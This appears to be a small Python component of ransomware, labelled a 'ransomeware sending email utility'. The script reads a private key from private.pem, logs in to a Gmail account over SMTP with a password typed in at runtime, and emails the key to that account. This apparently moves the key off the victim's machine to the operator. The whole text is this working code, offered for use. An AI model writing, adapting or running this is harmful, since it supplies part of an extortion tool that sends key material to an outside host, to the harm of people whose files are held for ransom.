# ransomeware sending email utility

import smtplib
import getpass

def gmail():
	key0 = open('private.pem', 'r')
	key = key0.read()
	email = "GMAIL_ACCOUNT"
	password = getpass.getpass(prompt=f'passwordTo_{email}: ', stream=None)
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	server.login(email, password)
	server.sendmail(email, email, key)
gmail()
